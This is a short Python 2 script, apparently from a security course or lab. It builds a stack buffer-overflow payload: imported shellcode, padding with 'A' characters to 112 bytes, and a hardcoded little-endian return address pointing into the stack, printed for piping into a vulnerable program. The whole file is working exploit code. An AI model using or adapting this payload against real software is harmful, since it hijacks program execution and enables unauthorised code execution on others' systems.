from struct import pack
from shellcode import shellcode

s = shellcode + "A" * (112 - len(shellcode))
retadd = 0xbffea07c
print s + str(pack("<I", retadd))